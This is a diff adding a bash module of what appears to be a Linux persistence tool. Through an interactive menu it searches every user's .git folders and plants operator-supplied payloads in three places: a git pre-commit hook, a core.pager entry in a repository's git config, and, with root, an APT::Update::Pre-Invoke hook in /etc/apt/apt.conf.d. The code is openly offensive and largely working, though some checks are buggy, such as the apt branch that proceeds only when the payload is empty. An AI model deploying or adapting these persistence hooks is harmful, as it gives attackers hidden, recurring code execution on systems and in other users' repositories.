@@ -1,0 +1,116 @@
+#!/usr/bin/env bash
+
+# --- all vars are exported in main script line:71 --- 
+# shellcheck disable=SC2154
+
+echo -e "${RED}$(line)${EOC}"
+echo -e "[1] Git hooks & config"
+echo -e "$(line)"
+echo -e "[2] Apt-get hooks"
+echo -e "${RED}$(line)${EOC}\n"
+
+read -rp $'\033[0;91m[*]\e[0m Enter your choice > ' hook_choice
+case $hook_choice in
+1)
+    echo 
+    echo -e "${RED}[*]${EOC} Searching for ${RED}.git${EOC} folders in ${RED}/home/${EOC} directories\n"    
+    # --- Finding all .git folders of all users & storing them in an array ---
+    mapfile -t git_folders < <(find /home/ -type d -name ".git") && \
+    echo -e "\n${RED}[+]${EOC} Found accessable ${RED}.git${EOC} folders for user ${RED}($USER)${EOC}:" # --- Display users founded .git folders ---
+    for ((n_folder=0; n_folder<${#git_folders[@]}; n_folder++)); do
+        echo -e "$(line)$(line)"
+        echo -e "${RED}[$((n_folder+1))]${EOC} - ${git_folders[$n_folder]}"
+    done;
+
+    echo
+    while true;
+    do
+      read -rp $'\033[0;91m[*]\e[0m Choose a .git folder to take futher actions > ' folder_num
+      if [[ "$folder_num" =~ ^[1-9][0-9]*$ && "$folder_num" -le "${#git_folders[@]}" ]]; then
+        selected_folder="${git_folders[$((folder_num-1))]}" 
+        cd "$selected_folder" || { echo -e "\n${RED}[x]${EOC} ${RED}$selected_folder${EOC} is not accessible for user (${RED}$USER${EOC})\n"; hooks; } 
+        echo -e "\n${RED}[+]${EOC} Current directory > ${RED}$(pwd)${EOC}" && \
+        echo -e "\n${RED}[+]${EOC} Last 3 commits of repo:\n" && \
+        git log -n 3;
+        break
+      else 
+        echo -e "\n${RED}[x]${EOC} Invalid .git folder\n"
+      fi
+    done
+    echo
+    
+    echo -e "${RED}$(line)${EOC}"
+    echo -e "${RED}[1]${EOC} Custom payload to ${RED}pre-commit hook${EOC}"
+    echo -e "$(line)"
+    echo -e "${RED}[2]${EOC} Custom payload to ${RED}git config file${EOC}"
+    echo -e "${RED}$(line)${EOC}\n"
+
+    while true; 
+    do
+        read -rp $'\033[0;91m[*]\e[0m Enter your choice > ' git_choice
+        if [[ "$git_choice" -eq 1 ]]; then 
+            echo -e "${RED}[*]${EOC} All avalable hooks in $selected_folder\n"
+            cd "$selected_folder"/hooks && "${RED}<(ls -la .)${EOC}"
+            pre_commit_file="pre-commit.sh"
+            if [[ -f "$pre_commit_file" ]]; then
+                echo -e "${RED}[+]${EOC} File \"$pre_commit_file\" exists"
+            elif [[ -f "pre-commit.sample" ]]; then
+                mv pre-commit.sample "$pre_commit_file" && chmod +x "$pre_commit_file" && \
+                echo -e "${RED}[+]${EOC} Found sample of ${RED}pre-commit${EOC} file, ${RED}renamed into .sh${EOC} & ${RED}made it executable${EOC}"
+            else
+                echo -e "${RED}[x]${EOC} Pre-commit hooks not found.\n" 
+            fi
+            read -rp $'\033[0;91m[*]\e[0m Enter your custom payload for pre-commit hook > ' pre_commit_payload
+            if [[ -n "$pre_commit_payload" ]]; then
+                echo -e "${RED}[+]${EOC} Adding custom pre-commit git hook\n"
+                echo -e "#!/bin/bash\n$pre_commit_payload" >> "$pre_commit_file" && \
+                chmod +x "$pre_commit_file" && \
+                echo -e "${RED}[+]${EOC} Pre-commit Git hook created successfully.\n" && break;
+            else 
+                echo -e "${RED}[x]${EOC} Payload cannot be empty\n"
+            fi
+    elif [[ "$git_choice" -eq 2 ]]; then
+        cd "$selected_folder" || { echo "${RED}[x]${EOC} $selected_folder is not accessible for user ($USER) "; hooks; }
+        if [[ -f $(pwd)/config ]] && [[ -w $(pwd)/config ]] && [[ -r $(pwd)/config ]]; then
+            echo -e "${RED}[+]${EOC} Git config file exits for current user ($USER) & have r/w premissions\n"
+            read -rp $'\033[0;91m[*]\e[0m Enter your custom payload > ' git_config_payload
+            if [[ -n "$git_config_payload" ]]; then
+                git_config_content=$(cat "$(pwd)/config")
+                if [[ ! "$git_config_content" =~ pager ]]; then # --- Checking if pager entry already exists ---
+                    echo -e "${RED}[*]${EOC} Adding payload to git config file \n"
+                    echo -e "\n[core]\n\tpager = $git_config_payload" >> "$(pwd)/config" && \
+                    echo -e "${RED}[+]${EOC} Payload successfuly added to \"$(pwd)/config\" file"
+                else # --- Adding user custom payload to existing pager entry --- 
+                    echo -e "${RED}[*]${EOC} Modifing pager configuration option\n"
+                    sed -i "s|pager =|pager = $git_config_payload|" "$(pwd)/config" && \
+                    echo -e "${RED}[+]${EOC} Pager configuration option modified successfuly" && hooks
+                fi
+            else 
+                echo -e "${RED}[x]${EOC} Payload cannot be empty\n" && hooks
+            fi
+        else
+            echo -e "${RED}[x]${EOC} Git config file not found or current user ($USER) don't have r/w premissions" && hooks    
+        fi;
+        
+    else
+        echo -e "\n${RED}[x]${EOC} Invalid option\n"
+    fi
+    done;;
+2)
+    if [[ "$priv_status" == "is_su" ]]; then
+        read -rp $'\033[0;91m[*]\e[0m Enter custom payload/command > ' apt_payload
+        if [[ -z "$apt_payload" ]]; then
+            echo -e "${RED}[+]${EOC} Apt config directory exitst\n"
+            sudo touch "/etc/apt/apt.conf.d/'$random'aptget"
+            echo "APT::Update::Pre-Invoke {\"$apt_payload\";};" | sudo tee "/etc/apt/apt.conf.d/'$random'aptget" > /dev/null
+            echo -e "${RED}[+]${EOC} Payload (\"'$apt_payload'\") successfuly implented in \"/etc/apt/apt.conf.d/'$random'aptget\""
+        else
+            echo -e "${RED}[x]${EOC} Payload cannot be empty \n" && hooks
+        fi;
+    else
+        echo -e "${RED}[x]${EOC} U need SU privileges to add custom payload to apt-get pre-invoke\n" && \
+        hooks
+    fi;;
+*)
+    echo -e "${RED}[x]${EOC} Invalid option\n" && hooks;;
+esac
